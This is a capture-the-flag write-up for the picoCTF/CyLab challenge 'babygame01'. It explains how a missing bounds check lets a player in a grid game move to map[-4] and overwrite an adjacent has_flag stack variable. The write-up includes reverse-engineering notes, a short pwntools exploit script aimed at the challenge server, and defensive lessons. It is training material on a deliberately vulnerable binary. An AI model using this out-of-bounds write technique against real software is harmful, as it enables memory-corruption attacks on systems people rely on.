# babygame01 — 2D Array Out-Of-Bounds (OOB) Write

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Binary Exploitation (Pwn / Logic)  
* **Difficulty:** Easy (CyLab 2)  
* **Tools:** `file`, `checksec`, GDB with `pwndbg`, IDA Pro, Python 3  
* **Binary:** 32-bit ELF (`game`) — game simulation  

---

## TL;DR

A fun challenge demonstrating that memory corruption is not just about smashing return addresses with buffer overflows. The program implements a 2D tile game where the player navigates a grid with `w`, `a`, `s`, and `d`. Due to missing boundary checks on player coordinates, steering off the grid causes an **Out-Of-Bounds (OOB) memory write**. By moving the player to relative offset `(0, -4)` (i.e., `map[-4]`), we overwrite an adjacent stack variable `has_flag` with non-zero character data. Pressing `p` triggers the win condition and reveals the flag.

---

## Student's Learning Note: C Arrays Are Just Pointer Arithmetic

Coming from languages like Python or Java where accessing an out-of-bounds index immediately throws an `IndexOutOfBoundsException`, C is unforgiving:

1. **No Bounds Checking:** In C, `map[y][x]` is purely syntactic sugar for pointer arithmetic:
   $$\text{Address} = \text{base\_address} + (y \times \text{WIDTH}) + x$$
2. **Negative Indexing into Neighboring Memory:** If the program doesn't verify that $x \ge 0$ and $y \ge 0$, negative indices calculate memory addresses located **before** the array on the stack.
3. **Targeting Business Logic Instead of Control Flow:** We don't always need to hijack `EIP` / `RIP` with ROP chains. If a critical state variable (like `has_flag` or `is_admin`) lives right next to our buffer, a simple logic overwrite is cleaner, stealthier, and 100% reliable!

---

## Reconnaissance & Reverse Engineering

Inspecting the decompilation in IDA Pro:
* The game map is a flat 2D character buffer: `char map[2700];`
* Immediately preceding `map` in stack memory is an integer flag:
  ```c
  int has_flag;   // Located at [ebp - 0xAA4]
  char map[2700]; // Located at [ebp - 0xAA0]
  ```
* Distance: `0xAA4 - 0xAA0 = -4` bytes. Thus, `map[-4]` directly overlaps with `has_flag`!
* The player starts at coordinates `(4, 4)`.
* Every time the player moves, the game updates the tile:
  `map[player_y][player_x] = player_tile;` (where `player_tile` is `'@'` or non-zero ASCII).
* When the user presses `'p'`, the game calls `solve_round()`:
  ```c
  if (has_flag != 0) {
      print_flag();
  }
  ```

---

## Exploitation: Steering Outside the Grid

To win:
1. We need `has_flag != 0`.
2. Because `has_flag` is located at `map[-4]`, moving the player 4 steps above row 0 (or 8 positions left depending on stride) writes the non-zero player tile byte directly into `has_flag`.
3. Starting from `(4, 4)`:
   * Move Left 8 times: `'a' * 8`
   * Move Up 4 times: `'w' * 4`
   * Player coordinates reach `(0, -4)`.
4. Press `'p'` to trigger `solve_round()` and win!

---

## My Debugging Hurdle: Remote TTY Desynchronization

When I tested this exploit over the remote socket by sending individual keystrokes:
```python
for move in moves:
    p.send(move)
    time.sleep(0.05)
```
The game would frequently drop or reorder moves due to network latency and line-buffering on the remote server's pseudo-terminal (TTY).

> [!TIP]
> **Batching Keystrokes:**  
> The program reads from `stdin` continuously. Instead of sending keystrokes one by one, we can batch the entire journey into a single atomic string followed by a newline:
> ```python
> payload = b"a" * 8 + b"w" * 4 + b"p"
> p.sendline(payload)
> ```
> The remote server consumes all moves in a single burst, immediately hits the winning condition, and outputs the flag!

---

## Exploit Script

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — babygame01
Exploit: 2D Array Out-Of-Bounds (OOB) write on adjacent stack variable
"""

from pwn import *

context.log_level = "info"

HOST = "xebec.cylabacademy.net"
PORT = 36644

def main():
    p = remote(HOST, PORT)

    # Move left 8, move up 4 to reach (0, -4), then 'p' to win
    payload = b"a" * 8 + b"w" * 4 + b"p"
    p.sendline(payload)

    output = p.recvall(timeout=5).decode(errors="replace")
    print(output)

if __name__ == "__main__":
    main()
```

*(See [`exploit.py`](exploit.py) for the complete script).*

---

## Flag

```text
academy{redacted}
```
*(Flag redacted in accordance with competition disclosure guidelines)*

---

## Key Takeaways & Lessons

1. **Verify Boundary Conditions on Coordinates:** Always check both lower bounds ($x \ge 0, y \ge 0$) and upper bounds when accessing arrays based on user input.
2. **Logic Tampering Over ROP:** If a business logic variable (like `is_admin` or `has_flag`) can be overwritten directly, memory corruption does not require complex ROP chains or libc leaks.
3. **Line-Buffering Resilience:** Batching keystroke inputs into atomic lines prevents timing and latency issues over remote sockets.
